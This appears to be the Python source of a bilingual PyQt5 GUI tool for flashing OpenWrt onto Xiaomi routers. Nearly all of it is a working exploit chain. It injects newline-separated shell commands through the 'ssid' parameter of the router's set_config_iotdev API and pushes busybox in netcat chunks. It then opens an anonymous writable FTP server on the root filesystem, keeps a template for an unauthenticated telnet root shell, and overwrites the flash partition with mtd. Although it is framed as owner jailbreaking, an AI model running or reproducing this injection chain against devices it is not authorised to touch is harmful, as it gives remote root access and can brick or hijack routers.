import sys
import json
import os
import threading
import urllib.parse
import base64
import requests

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QMessageBox, QHBoxLayout, QComboBox, QFileDialog, QMainWindow,
    QGroupBox
)

from PyQt5.QtCore import Qt

import base64
from netcat import send_file, receive_file
from time import sleep

from ftplib import FTP
import hashlib

get_url_template = 'http://{0}/cgi-bin/luci/;stok={1}/api/misystem/set_config_iotdev?bssid=XXXXX&user_id=XXXXX&ssid=-h%0A{2}%0A'

local_send_cmd_template = 'nc -l 1234 < {0}'
local_receive_cmd_template = 'nc -l 1234 > {0}'

router_send_cmd_template = 'nc {0} 1234 > {1}'
router_receive_cmd_template = 'nc {0} 1234 < {1}'

router_merge_cmd_template = 'cat /tmp/busybox_splited/x* > /tmp/busybox_merged'
router_decode_cmd_template = 'base64 -d /tmp/busybox_merged > /tmp/busybox'

router_chmod_busybox_cmd_template = 'chmod +x /tmp/busybox'
router_launch_busybox_telnet_cmd_template = '/tmp/busybox telnetd -l /bin/sh'
#router_launch_busybox_ftp_cmd_template = router_launch_busybox_telnet_cmd_template
router_launch_busybox_ftp_cmd_template = '/tmp/busybox tcpsvd -vE 0.0.0.0 21 /tmp/busybox ftpd -w /'

router_ip = ''
local_ip = ''
stok = ''
port = 1234
local_intermediate_file = './router_output.txt'
router_intermediate_file = '/tmp/router_output.txt'

LANGUAGES = {
    'en': {
        'title': "Xiaomi OpenWRT Flash Tool",
        'router_ip': "Router IP:",
        'stok': "STOK (Paste here):",
        'local_ip': "Local IP (for transfer):",
        'step1': "Step 1: Split busybox",
        'step1_btn': "Execute Split",
        'step2': "Step 2: Upload busybox",
        'step2_btn': "Upload Pieces",
        'step3': "Step 3: Merge busybox",
        'step3_btn': "Merge to Original",
        'step4': "Step 4: Execute busybox ftp",
        'step4_btn': "Start FTP Service",
        'step5': "Step 5: Upload openwrt.bin (MD5 Check)",
        'step5_btn': "Upload & Verify",
        'step6': "Step 6: Flash OpenWrt",
        'step6_btn': "Flash Firmware",
        'lang_btn': "切換至中文"
    },
    'zh': {
        'title': "小米 OpenWRT 刷機工具",
        'router_ip': "路由器 IP：",
        'stok': "STOK（請自行貼上）：",
        'local_ip': "本機 IP (上傳下載使用)：",
        'step1': "步驟一：Split busybox",
        'step1_btn': "執行分割 busybox",
        'step2': "步驟二：Upload busybox",
        'step2_btn': "上傳分割檔",
        'step3': "步驟三：Merge busybox",
        'step3_btn': "合併成原始檔",
        'step4': "步驟四：Execute busybox ftp",
        'step4_btn': "啟動 ftp 服務",
        'step5': "步驟五：Upload openwrt.bin（含檢查 md5）",
        'step5_btn': "上傳韌體並檢查",
        'step6': "步驟六：Flash OpenWrt",
        'step6_btn': "刷入韌體",
        'lang_btn': "Switch to English"
    }
}



def send_wrapper(path, port):
    success, msg = send_file(path, port)
    #show_message("Success" if success else "錯誤", msg)

def receive_wrapper(self, path, port):
    success, msg = receive_file(path, port)
    #show_message("Success" if success else "錯誤", msg)

class SplitBusyboxWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Split Busybox to multiple pieces")
        self.busybox_path_label = QLabel("Busybox Executable Path", self)
        self.busybox_path_input = QLineEdit(self)
        self.busybox_path_input.setText('./busybox')
        self.browse_busybox_path_btn = QPushButton("Choose File", self)
        self.browse_busybox_path_btn.clicked.connect(self.select_file)

        self.split_path_label = QLabel("Busybox Split Directory", self)
        self.split_path_input = QLineEdit(self)
        self.split_path_input.setText('./busybox_splited')
        self.browse_split_path_btn = QPushButton("Choose Directory", self)
        self.browse_split_path_btn.clicked.connect(self.select_dir)

        self.split_btn = QPushButton("Start Split", self)
        self.split_btn.clicked.connect(self.start_split)

        layout = QVBoxLayout()
        hlayout1 = QHBoxLayout()
        hlayout1.addWidget(self.busybox_path_label)
        hlayout1.addWidget(self.busybox_path_input)
        hlayout1.addWidget(self.browse_busybox_path_btn)
        hlayout2 = QHBoxLayout()
        hlayout2.addWidget(self.split_path_label)
        hlayout2.addWidget(self.split_path_input)
        hlayout2.addWidget(self.browse_split_path_btn)
        layout.addLayout(hlayout1)
        layout.addLayout(hlayout2)
        layout.addWidget(self.split_btn)
        self.setLayout(layout)
    def select_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Choose File", "./busybox")
        if path:
            self.busybox_path_input.setText(path)
    def select_dir(self):
        path = QFileDialog.getExistingDirectory(self, "Choose Directory", "./busybox_splited")
        if path:
            self.split_path_input.setText(path)
    def start_split(self):
        busybox_path = self.busybox_path_input.text().strip()
        output_dir = self.split_path_input.text().strip()

        if not os.path.isfile(busybox_path):
            QMessageBox.warning(self, "Error", "Please select a valid busybox file.")
            return
        if not os.path.isdir(output_dir):
            QMessageBox.warning(self, "Error", "Please select a valid output directory.")
            return

        try:
            # Read and base64 encode
            with open(busybox_path, 'rb') as f:
                b64_data = base64.b64encode(f.read())

            chunk_size = 6 * 1024  # 6KB
            num_chunks = (len(b64_data) + chunk_size - 1) // chunk_size

            for i in range(num_chunks):
                chunk = b64_data[i * chunk_size:(i + 1) * chunk_size]
                filename = f"x{chr(97 + (i // 26))}{chr(97 + (i % 26))}"  # xaa, xab, ...
                output_path = os.path.join(output_dir, filename)
                with open(output_path, 'wb') as out:
                    out.write(chunk)

            QMessageBox.information(self, "Done", f"Split into {num_chunks} files in:\n{output_dir}")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to split: {e}")


class UploadBusyboxWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Upload Busybox to router")
        
        self.split_path_label = QLabel("Busybox Split Directory", self)
        self.split_path_input = QLineEdit(self)
        self.split_path_input.setText('./busybox_splited')
        self.browse_split_path_btn = QPushButton("Choose Directory", self)
        self.browse_split_path_btn.clicked.connect(self.select_dir)
        self.start_upload_btn = QPushButton("Start Upload", self)
        self.start_upload_btn.clicked.connect(self.start_upload)

        layout = QVBoxLayout()
        hlayout1 = QHBoxLayout()
        hlayout1.addWidget(self.split_path_label)
        hlayout1.addWidget(self.split_path_input)
        hlayout1.addWidget(self.browse_split_path_btn)
        layout.addLayout(hlayout1)
        layout.addWidget(self.start_upload_btn)
        self.setLayout(layout)
    def select_dir(self):
        path = QFileDialog.getExistingDirectory(self, "Choose Directory", "./busybox_splited")
        if path:
            self.split_path_input.setText(path)

    def start_upload(self):
        global router_ip
        global local_ip
        global stok

        router_mkdir_cmd = 'mkdir /tmp/busybox_splited'
        encoded_cmd = urllib.parse.quote(router_mkdir_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        if response.status_code == 200:
            QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
            pass
        else:
            QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")

        dir_list = sorted(os.listdir(self.split_path_input.text()))
        router_dir = '/tmp/busybox_splited/'
        count = 0
        for file in dir_list:
            local_path = os.path.join(self.split_path_input.text(),file)
            print('uploading: {0}'.format(local_path))
            threading.Thread(target=send_wrapper, args=(local_path, port), daemon=True).start()
            

            sleep(0.1)

            router_path = os.path.join(router_dir, file)
            router_command = router_send_cmd_template.format(local_ip, router_path)
            encoded_cmd = urllib.parse.quote(router_command)
            try:
                response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
                if response.status_code == 200:
                    #QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
                    pass
                else:
                    QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")
            except Exception as e:
                QMessageBox.critical(self, "錯誤", f"連線Failed：{str(e)}")

            sleep(1)
            count += 1

class MergeBusyboxWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Merge Busybox on router")
        
        self.start_merge_btn = QPushButton("Start Merge", self)
        self.start_merge_btn.clicked.connect(self.start_merge)

        layout = QVBoxLayout()
        layout.addWidget(self.start_merge_btn)
        self.setLayout(layout)
    def start_merge(self):
        global router_ip
        global local_ip
        global stok

        #router_merge_cmd = router_merge_cmd_template.format('/tmp/busybox_splited/x*','/tmp/busybox_merged')
        router_merge_cmd = router_merge_cmd_template
        encoded_cmd = urllib.parse.quote(router_merge_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        if response.status_code == 200:
            QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
            pass
        else:
            QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")

        router_decode_cmd = router_decode_cmd_template.format('/tmp/busybox_merged','/tmp/busybox')
        router_decode_cmd = router_decode_cmd_template
        encoded_cmd = urllib.parse.quote(router_decode_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        if response.status_code == 200:
            QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
            pass
        else:
            QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")

class LaunchBusyboxWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Launch Busybox on router")
        
        self.start_launch_btn = QPushButton("Start Launch", self)
        self.start_launch_btn.clicked.connect(self.start_launch)

        layout = QVBoxLayout()
        layout.addWidget(self.start_launch_btn)
        self.setLayout(layout)
    def start_launch(self):
        global router_ip
        global local_ip
        global stok

        router_chmod_busybox_cmd = router_chmod_busybox_cmd_template
        encoded_cmd = urllib.parse.quote(router_chmod_busybox_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        if response.status_code == 200:
            QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
            pass
        else:
            QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")

        router_launch_busybox_ftp_cmd = router_launch_busybox_ftp_cmd_template
        encoded_cmd = urllib.parse.quote(router_launch_busybox_ftp_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        if response.status_code == 200:
            QMessageBox.information(self, "Success", f"Command sented.\nResponse : {response.text}")
            pass
        else:
            QMessageBox.warning(self, "Failed", f"HTTP Response code : {response.status_code}\nResponse : {response.text}")



class UploadFirmwareWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Upload Firmware & Check MD5")
        
        self.fw_path_label = QLabel("OpenWrt Firmware (.bin):", self)
        self.fw_path_input = QLineEdit(self)
        self.fw_path_input.setText('./openwrt.bin')
        self.browse_btn = QPushButton("Browse", self)
        self.browse_btn.clicked.connect(self.select_file)
        
        self.upload_btn = QPushButton("Start FTP Upload & Verify", self)
        self.upload_btn.clicked.connect(self.start_process)

        layout = QVBoxLayout()
        layout.addWidget(self.fw_path_label)
        h1 = QHBoxLayout()
        h1.addWidget(self.fw_path_input)
        h1.addWidget(self.browse_btn)
        layout.addLayout(h1)
        layout.addWidget(self.upload_btn)
        self.setLayout(layout)

    def select_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Firmware", "./", "Bin files (*.bin)")
        if path: self.fw_path_input.setText(path)

    def start_process(self):
        global router_ip, stok
        local_path = self.fw_path_input.text()
        filename = os.path.basename(local_path)
        
        # 1. 計算本地 MD5
        with open(local_path, "rb") as f:
            local_md5 = hashlib.md5(f.read()).hexdigest()
        
        # 2. FTP 上傳
        try:
            ftp = FTP(router_ip, timeout=10)
            ftp.login()
            ftp.cwd('/tmp')
            with open(local_path, 'rb') as f:
                ftp.storbinary(f'STOR {filename}', f)
            ftp.quit()
        except Exception as e:
            QMessageBox.critical(self, "FTP Error", f"Upload failed: {e}")
            return

        # 3. 遠端 MD5 檢查 (透過 RCE 送出 md5sum 並查看回應)
        check_cmd = f"md5sum /tmp/{filename} > {router_intermediate_file}"
        encoded_cmd = urllib.parse.quote(check_cmd)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        router_md5 = self.get_router_output()

        if local_md5 in router_md5:
            QMessageBox.information(self, "Success", f"MD5 Match!\nLocal: {local_md5}\nRemote check passed.")
        else:
            QMessageBox.critical(self, "Error", f"MD5 Mismatch!\nLocal: {local_md5}\nResponse: {response.text}")

    def get_router_output(self):
        global router_ip, local_ip, stok
        threading.Thread(target=self.receive_wrapper, args=(local_intermediate_file, port), daemon=True).start()
        command = router_receive_cmd_template.format(local_ip,router_intermediate_file)
        encoded_cmd = urllib.parse.quote(command)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        with open(local_intermediate_file, 'r') as file:
            file_content = file.read()
            return file_content
    
    def receive_wrapper(self, path, port):
        success, msg = receive_file(path, port)

class FlashFirmwareWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Final Flash - Write to OS1")
        
        # 使用英文警告訊息
        warning_text = (
            "WARNING: DO NOT power off during the flashing process!\n"
            "Target Partition: OS1\n"
            "Source Path: /tmp/openwrt.bin"
        )
        self.info = QLabel(warning_text, self)
        
        # 按鈕文字改為英文
        self.flash_btn = QPushButton("Execute mtd write (DANGER)", self)
        self.flash_btn.clicked.connect(self.confirm_flash)
        
        layout = QVBoxLayout()
        layout.addWidget(self.info)
        layout.addWidget(self.flash_btn)
        self.setLayout(layout)

    def confirm_flash(self):
        # 對話框改為英文
        reply = QMessageBox.question(
            self, 
            'Final Confirmation', 
            "Are you sure you want to write the firmware to Flash memory? This may permanently damage your device.",
            QMessageBox.Yes | QMessageBox.No, 
            QMessageBox.No
        )
        
        if reply == QMessageBox.Yes:
            self.execute_flash()

    def execute_flash(self):
        global router_ip, stok
        # 刷機指令
        flash_cmd = "mtd -e OS1 -r write /tmp/openwrt.bin OS1"
        encoded_cmd = urllib.parse.quote(flash_cmd)
        
        try:
            # 刷機指令執行後路由器會自動重啟 (-r 參數)
            response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
            QMessageBox.information(self, "Status", "Command sent successfully. Please observe the router's LED indicators.")
        except:
            # 重啟時連線中斷是正常現象
            QMessageBox.information(self, "Status", "Connection lost. The router might be rebooting into OpenWrt.")

class FlashTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.config_file = './config.json'
        self.current_lang = 'en'
        self.setWindowTitle("Xiaomi OpenWRT Flash Tool")
        self.setGeometry(200, 200, 400, 500)
        self.init_ui()
        self.load_config()
        self.retranslate_ui() # 套用語言

    def init_ui(self):
        central_widget = QWidget()
        layout = QVBoxLayout()

        # --- 最上方的語言切換鈕 ---
        self.lang_btn = QPushButton(self)
        self.lang_btn.clicked.connect(self.toggle_language)
        

        # 路由器 IP
        self.router_ip_label = QLabel(self)
        self.router_ip_input = QLineEdit(self)
        self.router_ip_input.setText("192.168.31.1")

        # STOK 欄位
        self.stok_label = QLabel(self)
        self.stok_input = QLineEdit(self)

        # 本機 IP
        self.local_ip_label = QLabel(self)
        self.local_ip_input = QLineEdit(self)
        self.local_ip_input.setText("192.168.31.236")

        
        layout.addWidget(self.lang_btn, alignment=Qt.AlignRight)
        layout.addWidget(self.router_ip_label)
        layout.addWidget(self.router_ip_input)

        layout.addWidget(self.stok_label)
        layout.addWidget(self.stok_input)

        layout.addWidget(self.local_ip_label)
        layout.addWidget(self.local_ip_input)

        # 步驟按鈕存入列表，方便後續更新文字
        self.step_groups = []
        self.step_btns = []
        
        steps = [
            ('step1', 'step1_btn', SplitBusyboxWindow),
            ('step2', 'step2_btn', UploadBusyboxWindow),
            ('step3', 'step3_btn', MergeBusyboxWindow),
            ('step4', 'step4_btn', LaunchBusyboxWindow),
            ('step5', 'step5_btn', UploadFirmwareWindow),
            ('step6', 'step6_btn', FlashFirmwareWindow),
        ]

        for s_key, b_key, win_cls in steps:
            group = QGroupBox()
            btn = QPushButton()
            btn.clicked.connect(lambda checked, cls=win_cls: self.enter_step_window(cls))
            
            g_layout = QHBoxLayout()
            g_layout.addWidget(btn)
            group.setLayout(g_layout)
            
            layout.addWidget(group)
            self.step_groups.append((group, s_key))
            self.step_btns.append((btn, b_key))

        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)
    
    def toggle_language(self):
        """切換語言狀態並更新 UI"""
        self.current_lang = 'zh' if self.current_lang == 'en' else 'en'
        self.retranslate_ui()

    def retranslate_ui(self):
        """根據目前的 current_lang 更新所有文字內容"""
        text = LANGUAGES[self.current_lang]
        
        self.setWindowTitle(text['title'])
        self.lang_btn.setText(text['lang_btn'])
        self.router_ip_label.setText(text['router_ip'])
        self.stok_label.setText(text['stok'])
        self.local_ip_label.setText(text['local_ip'])

        # 更新步驟群組標題
        for group, key in self.step_groups:
            group.setTitle(text[key])
        
        # 更新步驟按鈕文字
        for btn, key in self.step_btns:
            btn.setText(text[key])

    def create_step(self, title, button_text, window_class):
        group = QGroupBox(title)
        btn = QPushButton(button_text)
        btn.clicked.connect(lambda: self.enter_step_window(window_class))

        layout = QHBoxLayout()
        layout.addWidget(btn)
        group.setLayout(layout)
        return group
    
    def enter_step_window(self, window_class):
        self.set_variables()
        self.subwindow = window_class()
        self.subwindow.show()
        

    def set_variables(self):
        global router_ip
        global local_ip
        global stok
        #print('set_variables')
        router_ip = self.router_ip_input.text()
        local_ip = self.local_ip_input.text()
        stok = self.stok_input.text()
    
    def load_config(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    self.router_ip_input.setText(data.get("router_ip", "192.168.31.1"))
                    self.local_ip_input.setText(data.get("local_ip", "192.168.31."))
                    self.stok_input.setText(data.get("stok", ""))
                    print('config.json load success')
            except Exception as e:
                print(f"config.json load failed : {e}")

    
    def save_config(self):
        data = { "router_ip" : self.router_ip_input.text(), "local_ip" : self.local_ip_input.text(), "stok" : self.stok_input.text() }
        try:
            with open(self.config_file, "w", encoding="utf-8") as f:
                json.dump(data,f)
        except Exception as e:
            print(f"config.json save failed : {e}")

    def closeEvent(self,event):
        self.save_config()
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = FlashTool()
    window.show()
    sys.exit(app.exec_())
